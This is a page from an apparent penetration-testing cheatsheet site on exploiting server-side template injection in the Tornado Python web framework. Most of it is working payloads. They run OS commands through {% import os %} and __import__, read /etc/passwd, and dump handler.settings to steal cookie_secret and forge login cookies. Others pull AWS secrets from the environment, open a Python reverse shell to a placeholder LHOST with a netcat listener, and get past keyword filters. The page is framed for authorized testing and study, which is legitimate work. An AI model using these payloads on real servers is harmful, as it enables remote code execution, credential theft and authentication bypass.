@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tornado (Python - Tornado web framework) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Tornado (Python - Tornado web framework)</h1><p class="cx-lede">SSTI exploitation in Tornado templates - the {% import %} statement that reaches os/subprocess directly, handler-object loot, and reverse shells.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.006</span><span class="cx-tag">D3FEND D3-EAL, D3-PE</span><span class="cx-tag">IMPACT ServerSideEval, RCE, FileRead</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Tornado's template language is a thin wrapper over Python - templates compile to Python functions and run with no sandbox. Unlike Jinja2, it exposes a real <code>{% import %}</code> statement, so you reach <code>os</code>/<code>subprocess</code> directly without any class-graph walk.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm Python-family eval (same as Jinja2)
+{{7*7}}                                      # → 49
+{{7*&#x27;7&#x27;}}                                    # → 7777777 (Python string repeat)
+
+# RCE - the Tornado signature: import a module, then call it
+{% import os %}{{ os.system(&#x27;id&#x27;) }}
+{% import os %}{{ os.popen(&#x27;id&#x27;).read() }}
+{% import subprocess %}{{ subprocess.check_output(&#x27;id&#x27;, shell=True) }}
+
+# Loot - handler object leaks application settings incl. cookie_secret
+{{ handler.settings }}</code></pre></figure>
+<p>Success indicator: <code>id</code> output (uid/gid line) in the response, or <code>os.system</code> returning <code>0</code>.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>Tornado web framework</strong> - Python async web server. SSTI happens when attacker input becomes part of the <em>template source</em> that gets compiled - most directly <code>tornado.template.Template(user_input).generate(...)</code>, or any code that concatenates user input into a template string before rendering. Note the distinction: a <code>RequestHandler</code>'s <code>render(name)</code> / <code>render_string(name)</code> take a template <em>filename</em>, so controlling only that argument is template-file selection / path traversal, not SSTI - the input has to reach the template <em>body</em> for expressions to evaluate.</li>
+<li><strong>Standalone <code>tornado.template</code></strong> - the template module is sometimes embedded outside the web framework (email builders, code generators) because it's dependency-light.</li>
+<li><strong>Legacy Python stacks</strong> - Tornado predates ASGI and lingers in older Python services and internal tooling.</li>
+</ul>
+<p>Tornado is the engine the second SSTI exploitation example in the Server-side Attacks module walks through - the one where Jinja2/Twig-specific payloads all return <code>500</code> and the working payload turns out to be <code>{% import os %}{{ os.system('whoami') }}</code>.</p>
+<h2 id="step-1-confirm-and-disambiguate-from-jinja2">Step 1 - Confirm and disambiguate from Jinja2</h2>
+<p>Tornado sits in the <code>{{ ... }}</code> family and is Python-backed, so the two fast probes look <em>identical</em> to Jinja2:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*7}}                          # → 49        template eval confirmed
+{{7*&#x27;7&#x27;}}                        # → 7777777   Python-family (Jinja2, Tornado, Mako, ...)</code></pre></figure>
+<p>Neither of these separates Tornado from Jinja2 - both are Python, both repeat the string. The disambiguation is which engine-specific payloads throw and which evaluate:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Jinja2-specific - 500 / error on Tornado
+{{config}}                       # Jinja2: dumps Flask config.  Tornado: error
+{{self}}                         # Jinja2: runtime Context.     Tornado: error
+
+# NOT a distinguisher: the subclass walk evaluates in BOTH (both are unsandboxed
+# Python), so a result here only tells you &quot;Python family&quot;, not which engine:
+#   {{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__() }}
+# Use the {% import %} statement below to split Tornado from Jinja2.
+
+# Tornado-specific - evaluates on Tornado, errors on Jinja2
+{% import os %}{{ os.getcwd() }}         # Tornado: cwd string.  Jinja2: error (its {% import %} is for templates, not modules)
+{% import sys %}{{ sys.version }}        # Tornado: Python version.  Jinja2: error</code></pre></figure>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>The decisive tell is the <code>{% import %}</code> statement. Jinja2 <em>has</em> an <code>{% import %}</code> tag, but it imports <strong>other templates</strong>, not Python modules - <code>{% import os %}</code> raises in Jinja2. In Tornado, <code>{% import os %}</code> is a literal Python <code>import os</code>. If <code>{% import os %}{{ os.getcwd() }}</code> returns a path, you have Tornado (or another engine that compiles directly to Python, like Mako - see the fingerprint note below).</p>
+</div>
+<h3 id="splitting-tornado-from-mako">Splitting Tornado from Mako</h3>
+<p>Mako is the other "compiles to raw Python" engine and also evaluates Python expressions. Tell them apart by delimiter:</p>
+<ul>
+<li><strong>Tornado</strong> - <code>{{ expr }}</code> for output, <code>{% ... %}</code> for statements.</li>
+<li><strong>Mako</strong> - <code>${ expr }</code> for output, <code>&lt;% ... %&gt;</code> for statement blocks, <code>% ...</code> for line statements.</li>
+</ul>
+<p>If <code>{{7*7}}</code> evaluated, you are not on Mako (Mako would leave <code>{{7*7}}</code> literal and needs <code>${7*7}</code>). So within the <code>{{...}}</code>-Python family, the working <code>{% import %}</code> statement points at Tornado.</p>
+<h2 id="step-2-loot-before-escalating">Step 2 - Loot before escalating</h2>
+<p>Tornado's RCE is trivial, but the handler object is worth grabbing first - it is low-noise and <code>cookie_secret</code> alone is often game over.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Application settings - cookie_secret, debug flag, DB config stuffed in settings
+{{ handler.settings }}
+
+# Request object - headers, cookies, arguments
+{{ handler.request }}
+{{ handler.request.headers }}
+{{ handler.request.cookies }}
+
+# The application instance
+{{ handler.application.settings }}
+
+# Current user (whatever get_current_user returns)
+{{ handler.current_user }}</code></pre></figure>
+<p><code>handler.settings['cookie_secret']</code> is the key Tornado uses to sign secure cookies (<code>set_secure_cookie</code> / <code>get_secure_cookie</code>). With it you forge any user's <code>tornado_user</code>-style cookie and bypass authentication without needing RCE - the same leverage <code>{{config.SECRET_KEY}}</code> gives you on Flask/Jinja2.</p>
+<p>When the sink is a bare <code>tornado.template.Template</code> outside a request handler, <code>handler</code> is not defined - skip straight to Step 3.</p>
+<h2 id="step-3-rce">Step 3 - RCE</h2>
+<p>Tornado templates are not sandboxed. Import a module and call it in the same payload:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># os.system - returns the exit code (0 on success), prints output inline on some sinks
+{% import os %}{{ os.system(&#x27;id&#x27;) }}
+
+# os.popen - captures stdout, the reliable &quot;show me the output&quot; form
+{% import os %}{{ os.popen(&#x27;id&#x27;).read() }}
+{% import os %}{{ os.popen(&#x27;cat /etc/passwd&#x27;).read() }}
+{% import os %}{{ os.popen(&#x27;uname -a; hostname; whoami&#x27;).read() }}
+
+# subprocess - when os is filtered
+{% import subprocess %}{{ subprocess.check_output(&#x27;id&#x27;, shell=True) }}
+{% import subprocess %}{{ subprocess.check_output([&#x27;id&#x27;]) }}</code></pre></figure>
+<p>Prefer <code>os.popen(...).read()</code> - <code>os.system</code> returns the exit status (you see <code>0</code>, not the command output) unless the sink happens to capture stdout.</p>
+<h3 id="multi-statement-payloads">Multi-statement payloads</h3>
+<p><code>{% ... %}</code> blocks chain, so you can import once and use the module across several expressions:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% import os %}
+{{ os.popen(&#x27;id&#x27;).read() }}
+{{ os.popen(&#x27;ls -la /&#x27;).read() }}</code></pre></figure>
+<h3 id="arbitrary-python-via-builtins">Arbitrary Python via builtins</h3>
+<p>When you want full Python rather than shelling out, the <code>eval</code>/<code>exec</code> builtins are in template scope:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) }}
+{% import os %}{{ os.getenv(&#x27;AWS_SECRET_ACCESS_KEY&#x27;) }}</code></pre></figure>
+<h3 id="the-end-fingerprint">The <code>{% end %}</code> fingerprint</h3>
+<p>Tornado closes <strong>every</strong> control block with <code>{% end %}</code> - not <code>{% endfor %}</code> / <code>{% endif %}</code> as Jinja2 does. It matters when a payload needs a loop or conditional, and it is a clean secondary fingerprint:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% for i in [1, 2, 3] %}{{ i }}{% end %}     # Tornado → &#x27;123&#x27;;  Jinja2 → error (expects {% endfor %})</code></pre></figure>
+<p>(<code>{% raw expression %}</code> outputs an expression without autoescaping and does <strong>not</strong> open a block, so it needs no <code>{% end %}</code> - don't pair the two.)</p>
+<h2 id="file-read-without-command-execution">File read without command execution</h2>
+<p>When <code>os</code>/<code>subprocess</code> are filtered but <code>import</code> and expressions still work, read files with the builtin <code>open</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% import io %}{{ open(&#x27;/etc/passwd&#x27;).read() }}
+{{ open(&#x27;/etc/passwd&#x27;).read() }}             # open is a builtin - no import needed</code></pre></figure>
+<p>Tornado exposes Python builtins in template scope, so <code>open</code>, <code>__import__</code>, and friends are reachable directly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ __import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read() }}</code></pre></figure>
+<p><code>{{ __import__('os').popen('id').read() }}</code> is the shortest Tornado RCE - no <code>{% import %}</code> statement needed at all, just the builtin <code>__import__</code> in expression context.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Standard Python reverse shell through <code>os.system</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% import os %}{{ os.system(&#x27;python3 -c \&#x27;import socket,os,pty;s=socket.socket();s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)\&#x27;&#x27;) }}</code></pre></figure>
+<p>Listener:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">nc -lvnp &lt;LPORT&gt;</code></pre></figure>
+<p>When quoting across the sink is awkward, base64 the inner command:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% import os %}{{ os.system(&#x27;echo BASE64_PAYLOAD | base64 -d | python3&#x27;) }}</code></pre></figure>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<p>When keywords (<code>import</code>, <code>os</code>, <code>system</code>, <code>popen</code>) are blocked, see <a href="../filter-bypass/index.html">filter bypass</a>. Tornado-specific quick wins:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># __import__ builtin avoids the {% import %} statement keyword entirely
+{{ __import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read() }}
+
+# getattr chain avoids a literal &#x27;popen&#x27;
+{{ getattr(__import__(&#x27;os&#x27;), &#x27;pop&#x27;+&#x27;en&#x27;)(&#x27;id&#x27;).read() }}
+
+# dodge a literal command-string filter (e.g. &#x27;id&#x27; blocked) - split the command
+{% import os %}{{ os.popen(&#x27;i&#x27;+&#x27;d&#x27;).read() }}
+
+# dodge a literal &#x27;os&#x27; filter - split the module name
+{{ __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;id&#x27;).read() }}
+
+# dodge a literal &#x27;system&#x27; filter - build the attribute name
+{{ getattr(__import__(&#x27;os&#x27;), &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;id&#x27;) }}</code></pre></figure>
+<p>Because template scope is raw Python, any filter-bypass that works in a Python <code>eval</code> sink works here - string building, <code>getattr</code>, <code>chr()</code>-assembled names, hex-escaped identifiers.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>Confirm Tornado without escalating:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*7}}                                      # eval probe → 49
+{% import sys %}{{ sys.platform }}           # → &#x27;linux&#x27; / &#x27;win32&#x27; - confirms module import works
+{{ handler }}                                # → &lt;...RequestHandler object&gt; when sink is a handler</code></pre></figure>
+<p><code>{% import sys %}{{ sys.platform }}</code> is the cleanest non-destructive Tornado confirmation - it proves module import works (ruling out Jinja2) without running a command.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong><code>{{config}}</code> / <code>{{self}}</code> throw but <code>{{7*7}}</code> works.</strong> You are Python-family but not Jinja2. Try <code>{% import os %}{{ os.getcwd() }}</code> - if it evaluates, it's Tornado.</li>
+<li><strong><code>os.system</code> returns <code>0</code> and no output.</strong> Expected - <code>system</code> returns the exit code. Switch to <code>os.popen('...').read()</code> to capture stdout.</li>
+<li><strong><code>{% import os %}</code> raises a syntax error about <code>end</code>.</strong> Your payload opened a block Tornado expects you to close - but a bare <code>{% import os %}</code> needs no <code>{% end %}</code>. The error usually means a <em>different</em> block (a stray <code>{% if %}</code>/<code>{% for %}</code>) is unterminated.</li>
+<li><strong>Output is empty but no error.</strong> The sink rendered the template but discarded the expression value. Assign and echo, or make the whole payload a single <code>{{ ... }}</code> expression (<code>{{ __import__('os').popen('id').read() }}</code>).</li>
+<li><strong><code>handler</code> is undefined.</strong> The template is rendered by bare <code>tornado.template</code>, not a <code>RequestHandler</code>. Loot via <code>handler</code> is unavailable; go straight to <code>{% import os %}</code> RCE.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>No sandbox.</strong> Tornado has no equivalent of Jinja2's <code>SandboxedEnvironment</code> - there is no "sandboxed Tornado" to escape. If you can evaluate <code>{{ ... }}</code>, you have Python. This makes Tornado SSTI simpler and higher-impact than Jinja2 SSTI, where the sandbox and the class-graph walk add steps.</li>
+<li><strong><code>{% import %}</code> is the whole trick.</strong> The subclass-walk gymnastics the Jinja2 page documents are unnecessary here - Tornado hands you <code>import</code> directly. Reach for the walk only if <code>import</code> and <code>__import__</code> are both filtered.</li>
+<li><strong><code>{% end %}</code> closes every block</strong> (not <code>{% endif %}</code> / <code>{% endfor %}</code>). Both a fingerprint and a requirement when your payload uses control flow.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p><code>{% import os %}{{ os.system('id') }}</code> executes on the application server in the application's user context - the same blast radius as any RCE. Confirm scope before going past the <code>{{ handler.settings }}</code> / <code>cookie_secret</code> loot stage.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../razor/index.html">Previous: Razor (.NET - ASP.NET, ASP.NET Core)</a><a class="cx-next" href="../sandbox-escape/index.html">Next: Sandbox escape</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
